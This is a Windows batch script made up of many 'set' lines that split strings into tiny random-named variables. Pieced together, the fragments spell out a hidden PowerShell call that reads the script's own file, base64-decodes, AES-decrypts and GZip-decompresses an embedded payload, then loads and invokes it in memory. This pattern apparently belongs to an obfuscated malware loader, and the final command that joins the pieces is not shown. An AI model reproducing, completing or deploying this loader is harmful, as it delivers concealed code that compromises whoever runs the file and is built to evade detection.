@echo off
set "vXeoDfxLMO=co"
set "hTZrwpbXwe=ws"
set "Pmwyjhzbex=ll"
set "oTBiteGYcb=Sy"
set "hsJuOQofwC= C"
set "zwOLrrAuxV=do"
set "lpuTqoidMD=xe"
set "zNGFAHkJmj=he"
set "heNJpKSOtD=0\"
set "OCMkatkMXg=\W"
set "JPRBZbClrX=he"
set "ACYbPyJSuZ=po"
set "KNWdxXQgQt=32"
set "jmbojdnKAM=nd"
set "RCOCFBLdKR=in"
set "pJxftckebQ= /"
set "QIHQdSsAOw=s\"
set "qSmezhYtxW=Po"
set "mMwYTrNaTI=we"
set "thXAIuxaxf=ll"
set "PcKjoTaNds=.e"
set "EBmhwzfQxm=1."
set "poZjGrCuDo=Wi"
set "dMaryXGpBt=py"
set "SPocYYDwgq=rS"
set "XmpaKGeHnf=y "
set "RsojxvAOmf=ow"
set "fwyVTXaQLl=st"
set "BbeOlBDkfA=\v"
set "RNixxBEkkq=em"
set "daEMFRUPdj=we"
set "qHmleshYHK=:\"
set "pHClXxnuyA=rs"
set "GIYIFglXab=cd"
set "aEuTclCEHK= %~dp0"
set "AiQheHtITv===')"
set "TCuMakkHFl=e = "
set "FWFCjxThSK=ateD"
set "SatCDweGuq=);$N"
set "OOscKoMrnV=vert"
set "tUKrClwnrU=oArr"
set "BoPobxERIF=esFX"
set "lyItcEehYQ=sion"
set "bzskRwHHAe=tS46"
set "tUeFXpSDkL=0O+g"
set "oStpyStEaX=pres"
set "wfGHDaxZHD=();$"
set "ieFPLqmGgO=ose("
set "LDROuXRJGz=1..-"
set "GpjsGtZZoi=esaB"
set "cgTeHiKoIk=.Sec"
set "FRHKjfOWRe=Obje"
set "EpDTzcsuUZ=n ''"
set "zFfNnwwRxm=[Sys"
set "GXxEOyKoND=RkUC"
set "vyxcUeHFoH=V = "
set "wthgZNDwOU=.GZi"
set "qocJvHEekE=$tah"
set "bEoRpcPlgz=[Sys"
set "vKWkVJbRkE=join"
set "JnbfjsXtWR=eS.I"
set "tkNoLasYJD=ddin"
set "lOpmMVKnpK=$RkU"
set "tBatLvCAem=yste"
set "YLvZqXAdbJ=orF'"
set "AZuKEtyjKt= = $"
set "CFoRYKiCeS=File"
set "liLylSKtrc=pDZz"
set "fnVLRKlobv=;$ta"
set "lgUvDzARXm=yTo("
set "GATJeHwJbA=..-1"
set "mlAfUCmTsm=mory"
set "WdZfZkZNoK=-joi"
set "kOBFokjHdP=It.T"
set "WiNSazNdkA=raph"
set "SrBiGuAYKQ=Fina"
set "tmpzGfYsNm=fHeS"
set "vxOfTUBesa=NZMX"
set "yVmimEjofJ=ect "
set "HWXEULQeBJ=; };"
set "MotkVHiUxY=g, 0"
set "XiesRABHwN=$pmm"
set "xOLrPcNqqn=S46e"
set "AUtAJbPzJF=comp"
set "IrKiFHxSnj=g = "
set "gkRtjfWVZk=TArg"
set "HRfkTUtsIl=[IO."
set "OXeHhxYXbK=X) {"
set "uFDdVYIIGj=nirt"
set "UYOTlLtLaR=] -j"
set "mIPUEXdTCG=ew-O"
set "tMSEPoNaLs='dqR"
set "OawZNFCsVy=ZMXJ"
set "eKvIBoCRYg=XJ.D"
set "ikaPTydKTN=saBm"
set "QlLTPYVEwg=Syst"
set "yHhQcRBQPA=ecry"
set "fbknDIYEQP=em.I"
set "AKctWxZKCi=tem."
set "veCrDyHMuf=]::("
set "UAczmMgaHn=UGTu"
set "tJkIvgmMXr=gMod"
set "hUoXksLgqR=em.C"
set "eQpwGabxdq=hIt "
set "NQKWVnLOTX=bjec"
set "OFiejDvCCG=lQ.T"
set "lPGkkkBuvx=]::C"
set "fUwinxIehc=n ''"
set "PvQqBNuuOt=ptog"
set "vRnJluQixf=stem"
set "IzvXiplyRM=stem"
set "jFSPefLUUu= = ["
set "CJoGaGqeLK=oin "
set "XVkEENwqap=.Key"
set "ZfeMZGYMso=.IO."
set "uttholGYln=ing("
set "GLMbZBsJNx=lQ ="
set "FqpUyPQKRL=+hAO"
set "tAcBsrsOMr=ck($"
set "ySLImUyvnI=('%~f0'"
set "UErNXaLVpH=hfHe"
set "dupcWSWcbH=hIt."
set "WBeylVCbKB=y.Cr"
set "IMlLZTDYDJ=Secu"
set "rChiuDLRbZ=g = "
set "qhtRAizFCs=-joi"
set "mvSoamnebJ=rans"
set "EYMHnVprPD=ay()"
set "bUBWiAcuSM=hy.A"
set "eXRnYYTQKE=.Cry"
set "xETGrNmwwv=-nop"
set "oQgzfxLZFD=Stre"
set "EJXqzaMTOD=ress"
set "ZrhlsWGBna= [Sy"
set "pLvWKeAOqv=::De"
set "dlAGDfspwq=pose"
set "xehQMUlPMA= if "
set "VJLqJFaUht=F'[-"
set "XLFybtmLBm=;$QB"
set "RtoBMvJrcx=m.Re"
set "xiCDskARnX=fHeS"
set "CGmUHfWGUh=PKCS"
set "lrxtLBtZgZ=('l0"
set "DOpTncbCPd=t Sy"
set "qJTFZYhEZI=y]::"
set "KaOKOqZpZL=$pmm"
set "iNtyMymbBN=736u"
set "XZnHiprUFL=:('g"
set "oEiKYYlYxn=ring"
set "zBhFuAbdDj=rity"
set "jbEZbWlOqC=g = "
set "CbzOAMMLhw=($nH"
set "BsEeUqLbxS=Comp"
set "uCKukSFDtl=yste"
set "rqyiwBwvMn=join"
set "wGkPHrflDO=.Cop"
set "BLIhJvCOdP=tryP"
set "SpstWHlSkt=ZYYc"
set "KDaOwInToe=BC;$"
set "vtaSXeQoZN=oryS"
set "eyBLLpVQRa=le  "
set "UPQVdDkaom=EtfF"
set "ZSkDzZbWKp=morF"
set "yCqVZCRavq=]::N"
set "lvuefFuxEb=Disp"
set "GIDgNcZTlJ=esMa"
set "NYNikkvDFl=-Obj"
set "PyOPkKpVej=Invo"
set "qMzORgJZtD=)($j"
set "TCkgEWdKjl=$AEj"
set "bKeewfgSFL=.Len"
set "dgceHOioRW=);$h"
set "BlKSyirmrT=  $f"
set "ITyXVGZVqk=)))"
set "wCqOVwVlle=ypto"
set "YttptazRBj=('da"
set "ChKDjjHzZg=nage"
set "RwFwJdPnYX=comm"
set "GTDFRPomuA=$jTA"
set "ZvkEyqeBeK= = N"
set "uzliJHfPUk=;$Rk"
set "YiuIbMAZhR= [Sy"
set "UfcaGdmDzu=3HWs"
set "fpUSlTjXMZ=.Mod"
set "hIuZqVCNjA=daeR"
set "vsaXWUTKIF=jTAr"
set "mRzcNwvLMQ=jTAr"
set "RTlKBewqYM=tion"
set "XnScKDCjhh=stem"
set "FqHhgxsWHB=urit"
set "RMaIGaKMKZ=3); "
set "nVLUEVHssm=7;$h"
set "EgSREZuFxY=oint"
set "aHfdEgNKNx=Disp"
set "WrmpmDEhCE=CRO."
set "xRMiKrGoFK=bstr"
set "jxrOOulDkE=gth)"
set "tPLaUHxfBY=m(, "
set "WqsccPfjfp=ke($"
set "VGHEhCtUQn=ct S"
set "pemhzSHRMb=:: '"
set "xHhKSuOnZi=CHq."
set "rxHSQGPKUJ= '')"
set "cGdccfawLu=fHeS"
set "lDMemjVPrv=rtS4"
set "MNBITrYiYg=ddin"
set "rTdGfIgbvn=$NZM"
set "gCytIvVApZ=embl"
set "iEItfkojMK= '')"
set "YmsmhcLMWf='[-1"
set "NEKBpVvNJj=lBlo"
set "qJWLjxsgQl=($nH"
set "AVewXgkpSN=m.IO"
set "MvJzzsRufh=v4Ir"
set "TpVNlTjUAl=('%*'"
set "ZoVTEVFiMw=pher"
set "eXcfKDISxj=gnir"
set "GUVtCbcaPA=;$ta"
set "GEwOrdQpoP=.Dis"
set "sdHGBSfGyn=Secu"
set "HxgwQjctuT=pose"
set "QhNIirWQbZ=l.En"
set "XdKCvsYLoU=hX ="
set "xfPYWhbsFz=k; }"
set "dEtrLzxwtL=.Ass"
set "lSwNTXOQGg=form"
set "aybfYiaadG=Star"
set "XrzkXpXmbO=pStr"
set "CoREEzafVl=trea"
set "aSnRiNuiEC=mmlQ"
set "sMTEyejgCO=grap"
set "uAszxJiNQv=fHeS"
set "qWqfkjUzrt=rg);"
set "XBZPxOYFla=eam("
set "RlWlYfPEBY=6esa"
set "QAiytuJetS=ion."
set "hrCzGrfaNJ=m.IO"
set "lItNThmDgl== $h"
set "veCTsEfEOr=ct S"
set "yrscdpGaLL=onve"
set "MOyzTNeZbo=rity"
